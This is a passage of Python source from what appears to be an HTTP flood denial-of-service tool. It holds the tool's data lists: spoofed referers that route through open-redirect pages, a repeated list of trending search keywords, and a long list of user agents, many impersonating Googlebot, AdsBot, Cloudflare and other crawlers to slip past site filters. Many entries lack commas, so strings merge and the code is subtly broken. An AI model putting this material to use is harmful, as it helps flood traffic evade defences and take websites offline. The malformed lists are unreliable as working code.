	headers_referers.append('http://www.deminformatica.com/gotoURL.asp?url=')
	headers_referers.append('http://www.scienzaevita.info/public/site/gotoURL.asp?url=')
	headers_referers.append('http://www.the-cure.eu/gotoURL.asp?url=')
	headers_referers.append('http://www.deminformatica.com/gotoURL.asp?url=')
	headers_referers.append('http://www.scienzaevita.info/public/site/gotoURL.asp?url=')
	headers_referers.append('http://www.idealdieta.it/gotoURL.asp?url=')
	headers_referers.append('https://www.google.pl/interstitial?url=')
	headers_referers.append('http://www.ematube.it/gotoURL.asp?url=')
	headers_referers.append('http://' + host + '/')
	headers_referers.append('http://' + host + '/')
	return(headers_referers)
	
def keyword_list():
	global keyword_top
	keyword_top.append('Sex')
	keyword_top.append('Robin Williams')
	keyword_top.append('World Cup')
	keyword_top.append('Ca Si Le Roi')
	keyword_top.append('Ebola')
	keyword_top.append('Malaysia Airlines Flight 370')
	keyword_top.append('ALS Ice Bucket Challenge')
	keyword_top.append('Flappy Bird')
	keyword_top.append('Conchita Wurst')
	keyword_top.append('ISIS')
	keyword_top.append('Frozen')
	keyword_top.append('014 Sochi Winter Olympics')
	keyword_top.append('IPhone')
	keyword_top.append('Samsung Galaxy S5')
	keyword_top.append('Nexus 6')
	keyword_top.append('Moto G')
	keyword_top.append('Samsung Note 4')
	keyword_top.append('LG G3')
	keyword_top.append('Xbox One')
	keyword_top.append('Apple Watch')
	keyword_top.append('Nokia X')
	keyword_top.append('Ipad Air')
	keyword_top.append('Facebook')
	keyword_top.append('Sex')
	keyword_top.append('Robin Williams')
	keyword_top.append('World Cup')
	keyword_top.append('Ca Si Le Roi')
	keyword_top.append('Ebola')
	keyword_top.append('Malaysia Airlines Flight 370')
	keyword_top.append('ALS Ice Bucket Challenge')
	keyword_top.append('Flappy Bird')
	keyword_top.append('Conchita Wurst')
	keyword_top.append('ISIS')
	keyword_top.append('Frozen')
	keyword_top.append('014 Sochi Winter Olympics')
	keyword_top.append('IPhone')
	keyword_top.append('Samsung Galaxy S5')
	keyword_top.append('Nexus 6')
	keyword_top.append('Moto G')
	keyword_top.append('Samsung Note 4')
	keyword_top.append('LG G3')
	keyword_top.append('Xbox One')
	keyword_top.append('Apple Watch')
	keyword_top.append('Nokia X')
	keyword_top.append('Ipad Air')
	keyword_top.append('Facebook')
	keyword_top.append('Anonymous')
	keyword_top.append('Sex')
	keyword_top.append('Robin Williams')
	keyword_top.append('World Cup')
	keyword_top.append('Ca Si Le Roi')
	keyword_top.append('Ebola')
	keyword_top.append('Malaysia Airlines Flight 370')
	keyword_top.append('ALS Ice Bucket Challenge')
	keyword_top.append('Flappy Bird')
	keyword_top.append('Conchita Wurst')
	keyword_top.append('ISIS')
	keyword_top.append('Frozen')
	keyword_top.append('014 Sochi Winter Olympics')
	keyword_top.append('IPhone')
	keyword_top.append('Samsung Galaxy S5')
	keyword_top.append('Nexus 6')
	keyword_top.append('Moto G')
	keyword_top.append('Samsung Note 4')
	keyword_top.append('LG G3')
	keyword_top.append('Xbox One')
	keyword_top.append('Apple Watch')
	keyword_top.append('Nokia X')
	keyword_top.append('Ipad Air')
	keyword_top.append('Facebook')
	keyword_top.append('DVHT')
	keyword_top.append('VHS')
	keyword_top.append('THT')
	keyword_top.append('GLT')
	keyword_top.append('WT')
	keyword_top.append('LUX')
	keyword_top.append('Darius')
	keyword_top.append('Garen')
	keyword_top.append('Master Yi')
	keyword_top.append('Rengar')
	keyword_top.append('Katarina')
	keyword_top.append('Shen')
	keyword_top.append('Maphile')
	keyword_top.append('Support')
	keyword_top.append('Mid')
	keyword_top.append('Top')
	keyword_top.append('Bot')
	keyword_top.append('AD')
	keyword_top.append('Fucking')
	keyword_top.append('Diana')
	keyword_top.append('Kotex')
	keyword_top.append('BCS')
	keyword_top.append('ZingSpeed')
	keyword_top.append('Firerush')
	keyword_top.append('1Shot')
	keyword_top.append('TruyKich')
	keyword_top.append('IPhone')
	keyword_top.append('Star War')
	keyword_top.append('Windows 10')
	keyword_top.append('Zens Phone')
	keyword_top.append('Son Tung M-TP')
	keyword_top.append('Viurs')
	keyword_top.append('RIP Face')
	keyword_top.append('tao quan')
	keyword_top.append('gia xang')
	keyword_top.append('Roll Royce')
	keyword_top.append('Hai VL')
	keyword_top.append('Be Trang ss')
	keyword_top.append('FIFA')
	keyword_top.append('Bill Gate')
	keyword_top.append('UFO')
	keyword_top.append('Microsoft')
	keyword_top.append('Mark Zuckerberg')
	return(keyword_top)
	
useragents=["AdsBot-Google ( http://www.google.com/adsbot.html)",
			"Avant Browser/1.2.789rel1 (http://www.avantbrowser.com)",
                        "TelegramBot (like TwitterBot)"
                       "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36 TelegramBot (like TwitterBot)"
                        "Mozilla/5.0 (compatible; YandexAdNet/1.0; +http://yandex.com/bots)"
                        "Mozilla/5.0 (compatible; Cloudflare-Smart-Transit/1.0; +https://www.cloudflare.com/"
"Mozilla/5.0 (Linux; Android 5.0; SM-G920A) AppleWebKit (KHTML, like Gecko) Chrome Mobile Safari (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html)"
                        "Googlebot/2.1 (+http://www.google.com/bot.html)"                        "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Pinterestbot/1.0; +http://www.pinterest.com/bot.html)"
                        "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B411 Safari/600.1.4 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
                        "Mozilla/5.0 (Slurp/cat; slurp@inktomi.com; http://www.inktomi.com/slurp.html)"
                        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/536.28.10 (KHTML, like Gecko) Version/6.0.3 Safari/536.28.10",
                        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:20.0) Gecko/20100101 Firefox/20.0",
                        "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
                        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36 (compatible; YandexScreenshotBot/3.0; +http://yandex.com/bots)"
                        "Mozilla/5.0 (compatible; Cloudflare-Smart-Transit/1.0; +https://www.cloudflare.com/",
"Mozilla/5.0 (compatible; CloudFlare-AlwaysOnline/1.0; +http://www.cloudflare.com/always-online) AppleWebKit/534.34",
 "Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)",
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.5 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.4",
 "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
   " Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)",
     "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)",
                        "Mozilla/5.0 (Linux; U; Android 5.1; zh-cn; Build/LMY47D ) AppleWebKit/534.30 (KHTML,like Gecko) Version/4.0 Chrome/50.0.0.0 Mobile Safari/534.30 GIONEE-GN9010/GN9010 RV/5.0.16",
                       "Mozilla/5.0 (compatible; Google-Site-Verification/1.0)",
                       "Dalvik/1.6.0 (Linux; U; Android 4.4.2; GT-I9190 Build/KOT49H)",
                       "Mozilla/5.0 (Linux; Android 4.4.2; DEXP Ixion ES2 4.5 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.131 YaBrowser/14.5.1847.18432.00 Mobile Safari/537.36",
                        "Mozilla/5.0 (Linux; U; Android 6.0; zh-cn; Build/MRA58K ) AppleWebKit/534.30 (KHTML,like Gecko) Version/4.0 Chrome/50.0.0.0 Mobile Safari/534.30 GIONEE-S9/S9 RV/5.0.17",
                        "VK/28 CFNetwork/711.4.6 Darwin/14.0.0",
                        "Instagram 8.2.0 (iPhone4,1; iPhone OS 8_4; ru_RU; ru; scale=2.00; 640x960)    AppleWebKit/420+",
                        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36",
                       "Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)" 
                       "Mozilla/5.0 (compatible; vkShare; +vk.com/dev/Share)",
                       "Mozilla/5.0 (Windows Mobile 10; Android 8.0.0; Microsoft; Lumia 950XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Mobile Safari/537.36 Edge/80.0.361.62"  
                        "Mozilla/5.0 (Linux; Android 5.1.1) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Focus/2.3 Chrome/59.0.3071.125 Mobile Safari/537.36"
                        "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N)"
                        "Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.84 Safari/537.36 CrKey/1.21a.76178",
                        "Sogou head spider/3.0( http://www.sogou.com/docs/help/webmasters.htm#07)",
                        "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0"
                        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.99 Safari/537.36 Vivaldi/2.9.1705.41",
                         "Mozilla/5.0 (Linux; Android 9; STF-L09 Build/HUAWEISTF-L09; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.79 Mobile Safari/537.36 [Pinterest/Android]",
                        "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone9,1;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5;FBCR/Verizon]",
                        "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/13.3;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5;FBCR/AT&T]",
                       "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36",
                       "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36",
                       "WeatherReport/1.2.1 CFNetwork/485.12.7 Darwin/10.4.0",
                       "WeatherReport/1.2.2 CFNetwork/485.12.7 Darwin/10.4.0",
                       "Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1",
                        "Mozilla/5.0 (Linux; Android 4.2.2; Philips S388 Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Mobile Safari/537.36 OPR/34.0.2044.98679"
                        "Mozilla/5.0 (compatible; Discordbot/2.0; +https://discordapp.com)"
                       "Googlebot/2.1 ( http://www.googlebot.com/bot.html)"
                       "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",
                       "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36",
                       "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",
                       "APIs-Google (+https://developers.google.com/webmasters/APIs-Google.html)"
                       "Mozilla/5.0 (Linux; Android 4.4; Nexus 5 Build/_BuildID_) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36"
                       "Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16"
                       "Mozilla/5.0 (Linux; U; Android 2.3.1; en-us; MID Build/GINGERBREAD) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
                       "Mozilla/5.0 (Linux; U; Android 4.2.2; en-us; MID Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30 [FB_IAB/FB4A;FBAV/56.0.0.23.68;]",
                       "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.137 Safari/537.36 OPR/67.0.3575.79"
                       "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)"
"Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"
"DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)"
"Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
"Mozilla/5.0 (compatible; Exabot/3.0; +http://www.exabot.com/go/robot)"
"Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.5 (like Gecko) (Exabot-Thumbnails"
"facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
"ia_archiver (+http://www.alexa.com/site/help/webmasters; crawler@alexa.com)"
                       "Mozilla/5.0 (Linux; Android 8.1.0; motorola one Build/OPKS28.63-18-3; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 Instagram 72.0.0.21.98 Android (27/8.1.0; 320dpi; 720x1362; motorola; motorola one; deen_sprout; qcom; pt_BR; 132081645)"
                       "Googlebot/2.1 (+http://www.google.com/bot.html)"
                        "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"      
			"Baiduspider ( http://www.baidu.com/search/spider.htm)",
                        "Mozilla/5.0 (compatible; Linux x86_64; Mail.RU_Bot/Robots/2.0; +http://go.mail.ru/help/robots)"
                        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20051010 Firefox/1.0.7 (Ubuntu package 1.0.7)"
			"BlackBerry7100i/4.1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/103",
                 	"BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/5.0.3.3 UP.Link/5.1.2.12 (Google WAP Proxy/1.0)",
			"BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0",
                        "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
		"Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
		"Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
		"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
		"Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
		"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
		"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
		"Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
		"Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
		"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7",
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
		"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
		"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20120427 Firefox/15.0a1",
		"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b4pre) Gecko/20100815 Minefield/4.0b4pre",
		"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110622 Firefox/6.0a2",
		"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1",
		"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
		"Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0",
		"Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)",
		"Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016",
		"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10",
		"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.514.0 Safari/534.7",
		"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.23) Gecko/20090825 SeaMonkey/1.1.18",
		"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10",
		"Mozilla/5.0 (Windows; U; Windows NT 5.1; tr; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0E)",
		"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9",
		"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/533.17.8 (KHTML, like Gecko) Version/5.0.1 Safari/533.17.8",
		"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11 (.NET CLR 3.5.30729)",
		"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.6 (Change: )",
		"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1",
		"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/9.0.601.0 Safari/534.14",
		"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 GTB5",
		"Mozilla/5.0 (Windows; U; Windows NT 6.0 x64; en-US; rv:1.9pre) Gecko/2008072421 Minefield/3.0.2pre",
		"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.17) Gecko/20110123 (like Firefox/3.x) SeaMonkey/2.0.12",
		"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Chrome/4.0.249.0 Safari/532.5",
		"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5",
		"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.14 (KHTML, like Gecko) Chrome/10.0.601.0 Safari/534.14",
		"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20",
		"Mozilla/5.0 (Windows; U; Windows XP) Gecko MultiZilla/1.6.1.0a",
		"Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.2b) Gecko/20021001 Phoenix/0.2",
		"Mozilla/5.0 (X11; FreeBSD amd64; rv:5.0) Gecko/20100101 Firefox/5.0",
		"Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.34 (KHTML, like Gecko) QupZilla/1.2.0 Safari/534.34",
		"Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.1 (KHTML, like Gecko) Ubuntu/11.04 Chromium/14.0.825.0 Chrome/14.0.825.0 Safari/535.1",
		"Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.2 (KHTML, like Gecko) Ubuntu/11.10 Chromium/15.0.874.120 Chrome/15.0.874.120 Safari/535.2",
		"Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
		"Mozilla/5.0 (X11; Linux i686 on x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
		"Mozilla/5.0 (X11; Linux i686; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
		"Mozilla/5.0 (X11; Linux i686; rv:12.0) Gecko/20100101 Firefox/12.0 ",
		"Mozilla/5.0 (X11; Linux i686; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
		"Mozilla/5.0 (X11; Linux i686; rv:2.0b6pre) Gecko/20100907 Firefox/4.0b6pre",
		"Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0",
		"Mozilla/5.0 (X11; Linux i686; rv:6.0a2) Gecko/20110615 Firefox/6.0a2 Iceweasel/6.0a2",
		"Mozilla/5.0 (X11; Linux i686; rv:6.0) Gecko/20100101 Firefox/6.0",
		"Mozilla/5.0 (X11; Linux i686; rv:8.0) Gecko/20100101 Firefox/8.0",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Ubuntu/10.10 Chromium/12.0.703.0 Chrome/12.0.703.0 Safari/534.24",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5",
		"Mozilla/5.0 (X11; Linux x86_64; en-US; rv:2.0b2pre) Gecko/20100712 Minefield/4.0b2pre",
		"Mozilla/5.0 (X11; Linux x86_64; rv:10.0.1) Gecko/20100101 Firefox/10.0.1",
		"Mozilla/5.0 (X11; Linux x86_64; rv:11.0a2) Gecko/20111230 Firefox/11.0a2 Iceweasel/11.0a2",
		"Mozilla/5.0 (X11; Linux x86_64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
		"Mozilla/5.0 (X11; Linux x86_64; rv:2.2a1pre) Gecko/20100101 Firefox/4.2a1pre",
		"Mozilla/5.0 (X11; Linux x86_64; rv:5.0) Gecko/20100101 Firefox/5.0 Iceweasel/5.0",
		"Mozilla/5.0 (X11; Linux x86_64; rv:7.0a1) Gecko/20110623 Firefox/7.0a1",
		"Mozilla/5.0 (X11; U; FreeBSD amd64; en-us) AppleWebKit/531.2  (KHTML, like Gecko) Safari/531.2  Epiphany/2.30.0",
		"Mozilla/5.0 (X11; U; FreeBSD i386; de-CH; rv:1.9.2.8) Gecko/20100729 Firefox/3.6.8",
		"Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0",
		"Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.6) Gecko/20040406 Galeon/1.3.15",
		"Mozilla/5.0 (X11; U; FreeBSD; i386; en-US; rv:1.7) Gecko",
		"Mozilla/5.0 (X11; U; FreeBSD x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16",
		"Mozilla/5.0 (X11; U; Linux arm7tdmi; rv:1.8.1.11) Gecko/20071130 Minimo/0.025",
		"Mozilla/5.0 (X11; U; Linux armv61; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1",
		"Mozilla/5.0 (X11; U; Linux armv6l; rv 1.8.1.5pre) Gecko/20070619 Minimo/0.020",
		"Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.10.1",
		"Mozilla/5.0 (X11; U; Linux i586; en-US; rv:1.7.3) Gecko/20040924 Epiphany/1.4.4 (Ubuntu)",
		"Mozilla/5.0 (X11; U; Linux i686; en-us) AppleWebKit/528.5  (KHTML, like Gecko, Safari/528.5 ) lt-GtkLauncher",
		"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.4 (KHTML, like Gecko) Chrome/4.0.237.0 Safari/532.4 Debian",
		"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/532.8 (KHTML, like Gecko) Chrome/4.0.277.0 Safari/532.8",
			"BlackBerry8320/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/100",
           "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; snprtz|S26320700000083|2600#Service Pack 1#2#5#154321|isdn)"
    			"BlackBerry8330/4.3.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/105",
			"BlackBerry9000/4.6.0.167 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/102",
			"BlackBerry9530/4.7.0.167 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/102 UP.Link/6.3.1.20.0",
			"BlackBerry9700/5.0.0.351 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/123",
			"Bloglines/3.1 (http://www.bloglines.com)",
                        "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)"
"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)"
"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; InfoPath.1; SV1; .NET CLR 3.8.36217; WOW64; en-US)"
"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; .NET CLR 2.7.58687; SLCC2; Media Center PC 5.0; Zune 3.4; Tablet PC 3.6; InfoPath.3)"
 			"CSSCheck/1.2.2",    
			"Dillo/2.0",                                                                                                               
      			"DoCoMo/2.0 SH901iC(c100;TB;W24H12)",                                                                                                                                                         
			"Download Demon/3.5.0.11",
			"ELinks/0.12~pre5-4",
                        "11.50"
"PHP/7.1"
"Python-urllib/2.7"
"Rome"
"Tiny Tiny RSS/1.15.3 (http://tt-rss.org/)"
"Tiny Tiny RSS/17.12 (http://tt-rss.org/"
			"ELinks (0.4pre5; Linux 2.6.10-ac7 i686; 80x33)",
			"ELinks/0.9.3 (textmode; Linux 2.6.9-kanotix-8 i686; 127x41)",
			"EmailWolf 1.00",
	        	"everyfeed-spider/2.0 (http://www.everyfeed.com)",
			"facebookscraper/1.0( http://www.facebook.com/sharescraper_help.php)",
			"FAST-WebCrawler/3.8 (crawler at trd dot overture dot com; http://www.alltheweb.com/help/webmaster/crawler)",
			"FeedFetcher-Google; ( http://www.google.com/feedfetcher.html)",
			"Gaisbot/3.0 (robot@gais.cs.ccu.edu.tw; http://gais.cs.ccu.edu.tw/robot.php)",
    			"Googlebot/2.1 ( http://www.googlebot.com/bot.html)",
                        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5",
        "Opera/5.0 (Ubuntu; U; Windows NT 6.1; es; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13"
  "Opera/5.0 (SunOS 5.8 sun4u; U)  [en]"
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
	"Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1",
